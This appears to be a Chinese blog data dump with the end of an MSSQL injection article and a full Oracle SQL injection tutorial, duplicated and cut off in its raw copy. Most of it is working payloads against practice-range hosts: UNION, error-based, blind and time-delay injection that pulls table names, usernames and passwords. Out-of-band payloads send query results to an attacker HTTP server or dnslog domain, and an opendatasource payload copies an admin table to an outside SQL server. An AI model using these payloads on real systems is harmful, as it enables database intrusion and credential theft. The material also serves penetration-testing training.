TABLE data(id <span class=\"keyword\">INT</span>,username VARCHAR(<span class=\"number\">255</span>),passwd VARCHAR(<span class=\"number\">255</span>))</span><br></pre></td></tr></table></figure>\n\n<p>2、获取admin表中的数据</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=<span class=\"number\">1</span><span class=\"string\">&#x27;;insert into opendatasource(&#x27;</span>sqloled<span class=\"string\">b&#x27;,&#x27;</span>server=SQL5095.site4now.net,<span class=\"number\">1433</span>;uid=DB_14DC18D_test_admin;pwd=<span class=\"number\">123456</span>;database=DB_14DC18D_test<span class=\"string\">&#x27;).DB_14DC18D_test.dbo.data select id,username,passwd from  admin -- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p0.ssl.qhimg.com/t01b7ef0a0f00234293.png\"><br><img src=\"https://p4.ssl.qhimg.com/t01ce04ab44180c2881.png\"></p>\n<h1 id=\"0x08-总结\"><a href=\"#0x08-总结\" class=\"headerlink\" title=\"0x08 总结\"></a>0x08 总结</h1><pre><code>完成这篇文章共费时1周，主要花时间在环境搭建以及寻找在线靶场。全文从显错注入、报错注入到盲注和反弹注入，几乎涵盖了所有MSSQL注入类型，若有所遗漏还请联系我，我必将在原文基础上进行改进。因为能力有限，本文未进行太多了原理描述，也因为SQL注入原理市面上已经有很多文章进行了讲解，所以文章最终以实战注入作为重心开展，讲述找寻到注入点后在如何在多种情况下获取数据。\n\n靶场采用墨者学院、掌控安全，以及MSSQL-sqli-labs靶场，实际攻击时还需要考虑waf绕过等，后续会计划完成一篇针对waf绕过和提权getshell的文章，敬请期待～\n</code></pre>\n"},{"title":"Oracle数据库注入全方位利用总结(渗透必备)","keywords":"数据库,web安全,oracle,sql注入","description":"Oracle数据库注入全方位利用总结(渗透必备)","cover":"/images/oracle.png","date":"2021-02-02T02:45:41.000Z","_content":"\n<meta name=\"referrer\" content=\"no-referrer\"/>\n\n> 本文已发布到先知社区：https://xz.aliyun.com/t/9940\n>\n> 作者：ajie\n\n# 0x01 前言\n\n在渗透测试过程中，总是遇到不熟悉的数据库，知道了有SQL注入漏洞但是无法利用，这总让我很苦恼。因为网上的文章很多都是基于Mysql数据库的，当遇到Oracle数据库时有些数据库层面的不同点对于我们测试总会有点困扰，无法成功利用。故学习了Oracle数据库注入的相关知识，在此总结分享给大家，希望能够对安全从业人员有所帮助。\n全文基于对于SQL注入具有一定理解，并且能够在Mysql数据库进行注入的基础上进行阐述。本文旨在讲述Oracle数据库多种情况下如何进行注入，注重实战，相关概念问题请自行查阅资料，谢谢理解～\n\n# 0x02 注入点确定\n跟其他数据库一样，检测注入点都是可以通过拼接and语句进行判断。这里通过and 1=1 和and 1=2进行判断。实战中还可以通过延时函数进行判断。\n```\nhttp://219.153.49.228:43469/new_list.php?id=1%20and%201=1\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353232047-3c17c5db-589b-4002-a82a-6fbe01e576fe.png#align=left&display=inline&height=439&margin=%5Bobject%2Object%5D&name=image.png&originHeight=878&originWidth=1608&size=122915&status=done&style=none&width=804)\n```\nhttp://219.153.49.228:43469/new_list.php?id=1%20and%201=2\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353242702-ec873de8-7a5e-4bf6-b14f-3768ee4e8e76.png#align=left&display=inline&height=278&margin=%5Bobject%2Object%5D&name=image.png&originHeight=556&originWidth=1578&size=35308&status=done&style=none&width=789)\n# 0x03 显错注入\n## 1、判断字段数为2\n与其他注入一样，这里通过order by来判断字段数。因为order by 2页面正常，order by 3页面不正常，故判断当前字段数为2。\n```\nhttp://219.153.49.228:43469/new_list.php?id=1%20order%20by%202\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353279684-e0cc78c5-4353-4770-82e2-44b3b6176214.png#align=left&display=inline&height=420&margin=%5Bobject%2Object%5D&name=image.png&originHeight=840&originWidth=1458&size=116992&status=done&style=none&width=729)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353306166-7c477672-384f-4899-ab58-d487f859a22d.png#align=left&display=inline&height=220&margin=%5Bobject%2Object%5D&name=image.png&originHeight=440&originWidth=1412&size=29793&status=done&style=none&width=706)\n## 2、获取显错点\n联合查询这里使用了union select，oracle数据库与mysql数据库不同点在于它对于字段点数据类型敏感，也就是说我们不能直接union select 1,2,3来获取显错点了，需要在字符型字段使用字符型数据，整型字段使用整型数据才可以。如下，两个字段都为字符型，故使用union select 'null','null'。\n(在有些情况下也采用union all select的形式进行联合查询。union all select与union select的不同点可以很容易理解为all表示输出所有，也就是当数据出现相同时，将所有数据都输出；union select则会将相同数据进行过滤，只输出其中一条。)\n```\n#联合查询\nhttp://219.153.49.228:43469/new_list.php?id=-1 union select null,null from dual\n#修改null为'null'，判断字段类型均为字符型\nhttp://219.153.49.228:43469/new_list.php?id=-1 union select 'null','null' from dual\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353537650-e294e0ca-44d5-4884-9341-27dd41eff277.png#align=left&display=inline&height=500&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1000&originWidth=2526&size=171188&status=done&style=none&width=1263)\n后续便可以替换显错点进行注入。\n## 3、查询数据库版本信息\n```\nhttp://219.153.49.228:43469/new_list.php?id=-1 union select 'null',(select banner from sys.v_$version where rownum=1) from dual\n```\n## 4、获取当前数据库连接用户\n```\nhttp://219.153.49.228:43469/new_list.php?id=-1 union select 'null',(select sys_context('userenv','current_user') from dual) from dual\n\nhttp://219.153.49.228:44768/new_list.php?id=-1 union select '1',user from dual\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627354142760-9af3da8c-9eb3-4592-9c52-24a10e962061.png#align=left&display=inline&height=347&margin=%5Bobject%2Object%5D&name=image.png&originHeight=694&originWidth=2492&size=123811&status=done&style=none&width=1246)\n## 5、查询当前数据库库名\n```\nhttp://219.153.49.228:43469/new_list.php?id=-1 union select 'null',(select instance_name from V$INSTANCE) from dual\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627354254697-9084c0a1-02ea-4da6-8f68-b579e31135fd.png#align=left&display=inline&height=338&margin=%5Bobject%2Object%5D&name=image.png&originHeight=676&originWidth=2510&size=123816&status=done&style=none&width=1255)\n## 6、查询数据库表名\n查询表名一般查询admin或者user表\n### 直接查询\n获取第一个表名**LOGMNR_SESSION_EVOLVE$**\n```\nhttp://219.153.49.228:43469/new_list.php?id=-1 union select 'null',(select table_name from user_tables where rownum=1) from dual\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353844960-cad323f3-f77c-4c12-b1e8-9250896245b8.png#align=left&display=inline&height=254&margin=%5Bobject%2Object%5D&name=image.png&originHeight=508&originWidth=1252&size=21553&status=done&style=none&width=626)\n获取第二个表名**LOGMNR_GLOBAL$**\n```\nhttp://219.153.49.228:43469/new_list.php?id=-1 union select 'null',(select table_name from user_tables where rownum=1 and table_name not in 'LOGMNR_SESSION_EVOLVE$') from dual\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353863561-54f3d94e-8596-40c9-9f49-d2520256d80f.png#align=left&display=inline&height=238&margin=%5Bobject%2Object%5D&name=image.png&originHeight=476&originWidth=1166&size=18009&status=done&style=none&width=583)\n获取第三个表名**LOGMNR_GT_TAB_INCLUDE$**\n```\nhttp://219.153.49.228:43469/new_list.php?id=-1 union select 'null',(select table_name from user_tables where rownum=1 and table_name not in 'LOGMNR_SESSION_EVOLVE$' and table_name not in 'LOGMNR_GLOBAL$') from dual\n```\n### 模糊搜索查询\n获取sns_users表名\n```\nhttp://219.153.49.228:43469/new_list.php?id=-1 union select 'null',(select table_name from user_tables where table_name like '%user%' and rownum=1) from dual\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627354561532-baf25308-92eb-42f2-bc57-e95ddd2b1891.png#align=left&display=inline&height=346&margin=%5Bobject%2Object%5D&name=image.png&originHeight=692&originWidth=2496&size=125987&status=done&style=none&width=1248)\n## 7、查询数据库列名\n### 直接查询\n获取sns_users表里的字段\n```\nhttp://219.153.49.228:43469/new_list.php?id=-1 union select 'null',(select column_name from user_tab_columns where table_name='sns_users' and rownum=1) from dual\n\nhttp://219.153.49.228:43469/new_list.php?id=-1 union select 'null',(select column_name from user_tab_columns where rownum=1 and column_name not in 'USER_NAME') from dual\n\nhttp://219.153.49.228:43469/new_list.php?id=-1 union select 'null',(select column_name from user_tab_columns where rownum=1 and column_name not in 'USER_NAME' and column_name not in 'AGENT_NAME') from dual\n\n……………\n\nhttp://219.153.49.228:43469/new_list.php?id=-1 union select 'null',(select column_name from user_tab_columns where rownum=1 and column_name not in 'USER_NAME' and column_name not in 'AGENT_NAME' and column_name not in 'PROTOCOL' and column_name not in 'SPARE1' and column_name not in 'DB_USERNAME' and column_name not in 'OID' and column_name <> 'EVENTID' and column_name <> 'NAME' and column_name <> 'TABLE_OBJNO') from dual\n```\n```\n获取如下字段：\nUSER_NAME\nAGENT_NAME\nPROTOCOL\nSPARE1\nDB_USERNAME\nOID\nEVENTID\nNAME\nTABLE_OBJNO\nUSAGE\nUSER_PWD\n…………\n```\n### 模糊搜索查询\n```\nhttp://219.153.49.228:43469/new_list.php?id=-1 union select 'null',(select column_name from user_tab_columns where table_name='sns_users' and rownum=1 and column_name like '%USER%') from dual\n\nhttp://219.153.49.228:43469/new_list.php?id=-1 union select 'null',(select column_name from user_tab_columns where table_name='sns_users' and rownum=1 and column_name like '%USER%' and column_name <> 'USER_NAME') from dual\n```\n## 8、查询数据库数据\n获取账号密码字段内容\n```\nhttp://219.153.49.228:43469/new_list.php?id=-1 union select USER_NAME,USER_PWD from \"sns_users\" where rownum=1\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627355758027-eb920ce1-1667-40c4-9703-bf055011ce09.png#align=left&display=inline&height=332&margin=%5Bobject%2Object%5D&name=image.png&originHeight=664&originWidth=2436&size=124453&status=done&style=none&width=1218)\n\n\n```\nhttp://219.153.49.228:43469/new_list.php?id=-1 union select USER_NAME,USER_PWD from \"sns_users\" where rownum=1 and USER_NAME <> 'zhong'\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627355803061-53c045a9-600d-4231-911b-a0b145fd8d32.png#align=left&display=inline&height=308&margin=%5Bobject%2Object%5D&name=image.png&originHeight=616&originWidth=2470&size=127349&status=done&style=none&width=1235)\n```\nhttp://219.153.49.228:43469/new_list.php?id=-1 union select USER_NAME,USER_PWD from \"sns_users\" where rownum=1 and USER_NAME <> 'zhong' and USER_NAME not in 'hu'\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627355829407-d770aa94-c339-4686-8131-9c5b9910039e.png#align=left&display=inline&height=288&margin=%5Bobject%2Object%5D&name=image.png&originHeight=576&originWidth=2436&size=121972&status=done&style=none&width=1218)\n解密获取密码392118\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627355905460-f2485164-b4a8-4419-a99f-9752107804b7.png#align=left&display=inline&height=390&margin=%5Bobject%2Object%5D&name=image.png&originHeight=780&originWidth=1526&size=108851&status=done&style=none&width=763)\n\n\n## 9、美化输出\nOracle采用||进行数据连接\n```\nhttp://219.153.49.228:44768/new_list.php?id=-1 union select '用户名：'||USER_NAME,'密码：'||USER_PWD from \"sns_users\" where rownum=1\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627356270321-022d9ac4-944b-4251-9f20-fa13afadd1b9.png#align=left&display=inline&height=281&margin=%5Bobject%2Object%5D&name=image.png&originHeight=562&originWidth=2512&size=124098&status=done&style=none&width=1256)\n# 0x04 报错注入\n报错注入是一种通过函数报错前进行子查询获取数据，再通过错误页面回显的一种注入手法，下面介绍几种报错注入函数以及获取一些常见的获取数据，实际操作只需要将子查询内的查询语句进行替换即可。\n## 1、ctxsys.drithsx.sn()\n```\n#获取当前数据库用户 ORACLE1\n?id=1 and 1=ctxsys.drithsx.sn(1,(select user from dual)) --\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627370671892-ba68c50c-4b25-48c6-8121-2ee170485de9.png#align=left&display=inline&height=357&margin=%5Bobject%2Object%5D&name=image.png&originHeight=714&originWidth=2512&size=177516&status=done&style=none&width=1256)\n```\n#获取数据库版本信息\n?id=1 and 1=ctxsys.drithsx.sn(1,(select banner from sys.v_$version where rownum=1)) --\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627370745612-670ae342-fb32-42ff-8b48-bd894e0b6d3f.png#align=left&display=inline&height=341&margin=%5Bobject%2Object%5D&name=image.png&originHeight=682&originWidth=2492&size=195982&status=done&style=none&width=1246)\n## 2、XMLType()\n```\n?id=1 and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null --\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464280011-c070c8c1-5831-4516-93a5-d9de8e4728b2.png#align=left&display=inline&height=466&margin=%5Bobject%2Object%5D&name=image.png&originHeight=932&originWidth=1860&size=83611&status=done&style=none&width=930)\n## 3、dbms_xdb_version.checkin()\n```\n#获取数据库版本信息\n?id=1 and (select dbms_xdb_version.checkin((select banner from sys.v_$version where rownum=1)) from dual) is not null --\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627370853172-60c1003a-f2bc-45e7-88e4-e1dc5b544009.png#align=left&display=inline&height=352&margin=%5Bobject%2Object%5D&name=image.png&originHeight=704&originWidth=2466&size=181678&status=done&style=none&width=1233)\n## 4、bms_xdb_version.makeversioned()\n```\n#获取当前数据库用户 ORACLE1\n?id=1 and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null --\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627371068298-bf405b32-0774-4999-b59c-5f972ff993eb.png#align=left&display=inline&height=299&margin=%5Bobject%2Object%5D&name=image.png&originHeight=598&originWidth=2500&size=157266&status=done&style=none&width=1250)\n## 5、dbms_xdb_version.uncheckout()\n```\n#获取数据库版本信息\n?id=1 and (select dbms_xdb_version.uncheckout((select banner from sys.v_$version where rownum=1)) from dual) is not null --\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627371151615-1dc8551d-bb05-4b01-ab12-fb20b684f7b1.png#align=left&display=inline&height=305&margin=%5Bobject%2Object%5D&name=image.png&originHeight=610&originWidth=2464&size=184586&status=done&style=none&width=1232)\n## 6、dbms_utility.sqlid_to_sqlhash()\n```\n#获取数据库版本信息\n?id=1 and (SELECT dbms_utility.sqlid_to_sqlhash((select banner from sys.v_$version where rownum=1)) from dual) is not null --\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627371240951-badc7016-575d-4a23-9d5b-24d99923c150.png#align=left&display=inline&height=306&margin=%5Bobject%2Object%5D&name=image.png&originHeight=612&originWidth=2500&size=190889&status=done&style=none&width=1250)\n## 7、ordsys.ord_dicom.getmappingxpath()\n```\n?id=1 and 1=ordsys.ord_dicom.getmappingxpath((select banner from sys.v_$version where rownum=1),user,user)--\n```\n## 8、utl_inaddr.*()\nutl_inaddr（用于取得局域网或Internet环境中的主机名和IP地址）\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627369182388-db5976e4-c62c-460c-a76e-4a3b9fdadf0e.png#align=left&display=inline&height=444&margin=%5Bobject%2Object%5D&name=image.png&originHeight=888&originWidth=1480&size=138926&status=done&style=none&width=740)\n```\n?id=1 and 1=utl_inaddr.get_host_name((select user from dual)) --\n?id=1 and 1=utl_inaddr.get_host_address((select user from dual)) --\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464133762-13bb4b59-3f8f-466a-b970-082352b0484e.png#align=left&display=inline&height=398&margin=%5Bobject%2Object%5D&name=image.png&originHeight=796&originWidth=1692&size=57659&status=done&style=none&width=846)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464181708-702fd815-478b-488f-8c3a-565adb5fb2f4.png#align=left&display=inline&height=458&margin=%5Bobject%2Object%5D&name=image.png&originHeight=916&originWidth=1810&size=65997&status=done&style=none&width=905)\n# 0x05 布尔型盲注\n常用猜解：\n```\n#猜长度\n?id=1 and 6=(select length(user) from dual)--\n#截取值猜ascii码\n?id=1 and (select ascii(substr(user,1,1)) from dual)>83\n?id=1 and (select ascii(substr(user,1,1)) from dual)=83\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627358275597-570e4d7d-7594-4570-bd79-ff983c61706e.png#align=left&display=inline&height=380&margin=%5Bobject%2Object%5D&name=image.png&originHeight=760&originWidth=2404&size=187790&status=done&style=none&width=1202)\n## 1、decode函数布尔盲注\ndecode(字段或字段的运算，值1，值2，值3）\n这个函数运行的结果是，当字段或字段的运算的值等于值1时，该函数返回值2，否则返回3\n\n### 测试用户名长度\n```\nhttp://219.153.49.228:44768/new_list.php?id=1 and 6=(select length(user) from dual) --\n```\n### 测试当前用户是否为SYSTEM\n```\n#如果是system用户则返回正常，不是则返回不正常\nhttp://219.153.49.228:44768/new_list.php?id=1 and 1=(select decode(user,'SYSTEM',1,0) from dual) -- \n```\n```\n#使用substr截断，逐个字段进行猜解\nhttp://219.153.49.228:44768/new_list.php?id=1 and 1=(select decode(substr(user,1,1),'S',1,0) from dual) -- \n?id=1 and 1=(select decode(substr(user,2,1),'Y',1,0) from dual) -- \n?id=1 and 1=(select decode(substr(user,3,1),'S',1,0) from dual) --\n?id=1 and 1=(select decode(substr(user,4,1),'T',1,0) from dual) --\n?id=1 and 1=(select decode(substr(user,5,1),'E',1,0) from dual) --\n?id=1 and 1=(select decode(substr(user,6,1),'M',1,0) from dual) --\n\n#当然也可以配合ascii码进行猜解\n?id=1 and 1=(select decode(ascii(substr(user,1,1)),'83',1,0) from dual) --\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627366490187-723fa9dc-c6d7-4858-a429-d98bbe77cab4.png#align=left&display=inline&height=436&margin=%5Bobject%2Object%5D&name=image.png&originHeight=872&originWidth=2424&size=197040&status=done&style=none&width=1212)\n## 2、instr函数布尔盲注\ninstr函数的应用：\n```\nselect instr('abcdefgh','de') position from dual;\n#返回结果：4\n```\n盲注中的应用：\n```\nhttp://219.153.49.228:44768/new_list.php?id=1 and 1=(instr((select user from dual),'SYS')) --\n?id=1 and 4=(instr((select user from dual),'T')) --\n```\n# 0x06 延时盲注\n## 1、检测漏洞存在\nDBMS_PIPE.RECEIVE_MESSAGE函数的作用是从指定管道获取消息。\n具体用法为：**DBMS_PIPE.RECEIVE_MESSAGE('pipename',timeout)**\n**pipename**为varchar(128)的字符串，用以指定管道名称，在这里我们输入任意值即可。\n**timeout**为integer的可选输入参数，用来指定等待时间。\n常用payload如下：\n```\nhttp://219.153.49.228:44768/new_list.php?id=1 and 1=dbms_pipe.receive_message('o', 10)--\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627365780661-fefb7bcc-e426-4014-8c09-9803fbb76335.png#align=left&display=inline&height=421&margin=%5Bobject%2Object%5D&name=image.png&originHeight=842&originWidth=2528&size=312249&status=done&style=none&width=1264)\n如果页面延时10秒返回，即存在注入。\n## 2、配合decode函数延时盲注\n只需要将延时语句放入decode函数中即可\n```\n#直接猜解字符\n?id=1 and 1=(select decode(substr(user,1,1),'S',dbms_pipe.receive_message('o',5),0) from dual) --\n\n#通过ascii猜解字符\n?id=1 and 1=(select decode(ascii(substr(user,1,1)),'83',dbms_pipe.receive_message('o',5),0) from dual) --\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627366016814-7d8cdee4-c932-4907-87e0-017ae7f6296f.png#align=left&display=inline&height=506&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1012&originWidth=2146&size=293305&status=done&style=none&width=1073)\n## 3、使用其他延时查询来判断\n如(select count(*) from all_objects) ，因为查询结果需要一定的时间，在无法使用dbms_pipe.receive_message()函数的情况下可以使用这个。具体操作只需要将decode()函数的返回结果进行替换即可。\n```\n#直接猜解字符\n?id=1 and 1=(select decode(substr(user,1,1),'S',(select count(*) from all_objects),0) from dual) --\n\n#通过ascii猜解字符\n?id=1 and 1=(select decode(ascii(substr(user,1,1)),'83',(select count(*) from all_objects),0) from dual) --\n```\n# 0x07 外带数据注入\n## 1、url_http.request()\n使用此方法，用户需要有utl_http访问网络的权限\n首先检测是否支持，页面返回正常则表示支持\n```\n?id=1 and exists (select count(*) from all_objects where object_name='UTL_HTTP') --\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464342525-e4cd81f2-77a8-4a90-ace7-36aa714ccdaa.png#align=left&display=inline&height=369&margin=%5Bobject%2Object%5D&name=image.png&originHeight=738&originWidth=1854&size=42432&status=done&style=none&width=927)\n然后python起一个http服务，或者开启nc监听。这里我使用python开启一个服务：\n```\npython3 -m http.server 4455\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464776325-cd84daca-3f18-48a5-86a3-9a92df1fdd05.png#align=left&display=inline&height=145&margin=%5Bobject%2Object%5D&name=image.png&originHeight=290&originWidth=1144&size=47561&status=done&style=none&width=572)\n```\n#子查询数据库版本信息并访问python起的http服务\n?id=1 and utl_http.request('http://192.168.100.130:4455/'||(select banner from sys.v_$version where rownum=1))=1--\n\n#http访问时可以将||进行URL编码\n?id=1 and utl_http.request('http://192.168.100.130:4455/'%7C%7C(select banner from sys.v_$version where rownum=1))=1--\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464897258-175be638-08f8-4355-8ce8-e2552bfdd355.png#align=left&display=inline&height=372&margin=%5Bobject%2Object%5D&name=image.png&originHeight=744&originWidth=1868&size=59899&status=done&style=none&width=934)\n可以看到成功获取了数据\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464921197-61542222-97e4-4941-b1d9-ca5bdcec6fe2.png#align=left&display=inline&height=234&margin=%5Bobject%2Object%5D&name=image.png&originHeight=468&originWidth=1454&size=124719&status=done&style=none&width=727)\n\n\n## 2、utl_inaddr.get_host_address()函数\n```\n#使用dnslog外带数据\n?id=1 and (select utl_inaddr.get_host_address((select user from dual)||'.eeaijt.dnslog.cn') from dual)is not null --\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627465955162-98de91a3-8382-4073-bcf3-18728762e3f1.png#align=left&display=inline&height=343&margin=%5Bobject%2Object%5D&name=image.png&originHeight=686&originWidth=1664&size=42677&status=done&style=none&width=832)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627465968725-e5b0236e-0e8d-4aa2-8556-eb6fbf6e935f.png#align=left&display=inline&height=283&margin=%5Bobject%2Object%5D&name=image.png&originHeight=566&originWidth=1680&size=59996&status=done&style=none&width=840)\n## 3、SYS.DBMS_LDAP.INIT()函数\n网上说是可以使用，我试着不行，收不到数据，不知道是不是环境问题。\n```\n?id=1 and (select SYS.DBMS_LDAP.INIT((select user from dual)||'.51prg6.dnslog.cn',80) from dual)is not null --\n\n?id=1 and (select DBMS_LDAP.INIT((select user from dual)||'.51prg6.dnslog.cn',80) from dual)is not null --\n```\n## 4、HTTPURITYPE()函数\n```\n?id=1 and (select HTTPURITYPE('http://192.168.100.130:4455/'||(select user from dual)).GETCLOB() FROM DUAL)is not null --\n```\n同样需要python起一个http服务，或者nc创建监听\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627466748565-80964d64-450b-46fc-8f89-77bdb55ce3cd.png#align=left&display=inline&height=419&margin=%5Bobject%2Object%5D&name=image.png&originHeight=838&originWidth=1878&size=78666&status=done&style=none&width=939)\n虽然访问404，但是同样成功外带数据。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627466760517-a4a23a26-b2d0-4ea8-96c9-3a7c5470b395.png#align=left&display=inline&height=230&margin=%5Bobject%2Object%5D&name=image.png&originHeight=460&originWidth=1454&size=97022&status=done&style=none&width=727)\n# 0x08 总结\nOracle数据库注入跟日常的注入其实没有什么太大的分别，需要注意数据类型的一致性和常用表名列名的不同即可，在sql注入的原理上都是拼接sql语句并执行。在实战中企业还是有很大部分使用Oracle数据库，故在此进行分析总结，希望能够对渗透测试人员有所帮助。\n以上测试靶场采用墨者学院Oracle注入靶场、掌控安全Oralce注入靶场以及本地搭建的Oracle数据库，在实战中可能会遇到waf等安全设备的拦截，后续将针对Oracle数据库waf绕过编写一篇文章，敬请期待ing～\n","source":"_posts/Oracle数据库注入总结.md","raw":"---\ntitle: Oracle数据库注入全方位利用总结(渗透必备)\ntags: \n  - 数据库\n  - SQL注入\n  - oracle\ncategories: web安全\nkeywords: '数据库,web安全,oracle,sql注入'\ndescription: Oracle数据库注入全方位利用总结(渗透必备)\ncover: /images/oracle.png\ndate: 2021-02-02 10:45:41\n---\n\n<meta name=\"referrer\" content=\"no-referrer\"/>\n\n> 本文已发布到先知社区：https://xz.aliyun.com/t/9940\n>\n> 作者：ajie\n\n# 0x01 前言\n\n在渗透测试过程中，总是遇到不熟悉的数据库，知道了有SQL注入漏洞但是无法利用，这总让我很苦恼。因为网上的文章很多都是基于Mysql数据库的，当遇到Oracle数据库时有些数据库层面的不同点对于我们测试总会有点困扰，无法成功利用。故学习了Oracle数据库注入的相关知识，在此总结分享给大家，希望能够对安全从业人员有所帮助。\n全文基于对于SQL注入具有一定理解，并且能够在Mysql数据库进行注入的基础上进行阐述。本文旨在讲述Oracle数据库多种情况下如何进行注入，注重实战，相关概念问题请自行查阅资料，谢谢理解～\n\n# 0x02 注入点确定\n跟其他数据库一样，检测注入点都是可以通过拼接and语句进行判断。这里通过and 1=1 和and 1=2进行判断。实战中还可以通过延时函数进行判断。\n```\nhttp://219.153.49.228:43469/new_list.php?id=1%20and%201=1\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353232047-3c17c5db-589b-4002-a82a-6fbe01e576fe.png#align=left&display=inline&height=439&margin=%5Bobject%2Object%5D&name=image.png&originHeight=878&originWidth=1608&size=122915&status=done&style=none&width=804)\n```\nhttp://219.153.49.228:43469/new_list.php?id=1%20and%201=2\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353242702-ec873de8-7a5e-4bf6-b14f-3768ee4e8e76.png#align=left&display=inline&height=278&margin=%5Bobject%2Object%5D&name=image.png&originHeight=556&originWidth=1578&size=35308&status=done&style=none&width=789)\n# 0x03 显错注入\n## 1、判断字段数为2\n与其他注入一样，这里通过order by来判断字段数。因为order by 2页面正常，order by 3页面不正常，故判断当前字段数为2。\n```\nhttp://219.153.49.228:43469/new_list.php?id=1%20order%20by%202\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353279684-e0cc78c5-4353-4770-82e2-44b3b6176214.png#align=left&display=inline&height=420&margin=%5Bobject%2Object%5D&name=image.png&originHeight=840&originWidth=1458&size=116992&status=done&style=none&width=729)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353306166-7c477672-384f-4899-ab58-d487f859a22d.png#align=left&display=inline&height=220&margin=%5Bobject%2Object%5D&name=image.png&originHeight=440&originWidth=1412&size=29793&status=done&style=none&width=706)\n## 2、获取显错点\n联合查询这里使用了union select，oracle数据库与mysql数据库不同点在于它对于字段点数据类型敏感，也就是说我们不能直接union select 1,2,3来获取显错点了，需要在字符型字段使用字符型数据，整型字段使用整型数据才可以。如下，两个字段都为字符型，故使用union select 'null','null'。\n(在有些情况下也采用union all select的形式进行联合查询。union all select与union select的不同点可以很容易理解为all表示输出所有，也就是当数据出现相同时，将所有数据都输出；union select则会将相同数据进行过滤，只输出其中一条。)\n```\n#联合查询\nhttp://219.153.49.228:43469/new_list.php?id=-1 union select null,null from dual\n#修改null为'null'，判断字段类型均为字符型\nhttp://219.153.49.228:43469/new_list.php?id=-1 union select 'null','null' from dual\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353537650-e294e0ca-44d5-4884-9341-27dd41eff277.png#align=left&display=inline&height=500&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1000&originWidth=2526&size=171188&status=done&style=none&width=1263)\n后续便可以替换显错点进行注入。\n## 3、查询数据库版本信息\n```\nhttp://219.153.49.228:43469/new_list.php?id=-1 union select 'null',(select banner from sys.v_$version where rownum=1) from dual\n```\n## 4、获取当前数据库连接用户\n```\nhttp://219.153.49.228:43469/new_list.php?id=-1 union select 'null',(select sys_context('userenv','current_user') from dual) from dual\n\nhttp://219.153.49.228:44768/new_list.php?id=-1 union select '1',user from dual\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627354142760-9af3da8c-9eb3-4592-9c52-24a10e962061.png#align=left&display=inline&height=347&margin=%5Bobject%2Object%5D&name=image.png&originHeight=694&originWidth=2492&size=123811&status=done&style=none&width=1246)\n## 5、查询当前数据库库名\n```\nhttp://219.153.49.228:43469/new_list.php?id=-1 union select 'null',(select instance_name from V$INSTANCE) from dual\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627354254697-9084c0a1-02ea-4da6-8f68-b579e31135fd.png#align=left&display=inline&height=338&margin=%5Bobject%2Object%5D&name=image.png&originHeight=676&originWidth=2510&size=123816&status=done&style=none&width=1255)\n## 6、查询数据库表名\n查询表名一般查询admin或者user表\n### 直接查询\n获取第一个表名**LOGMNR_SESSION_EVOLVE$**\n```\nhttp://219.153.49.228:43469/new_list.php?id=-1 union select 'null',(select table_name from user_tables where rownum=1) from 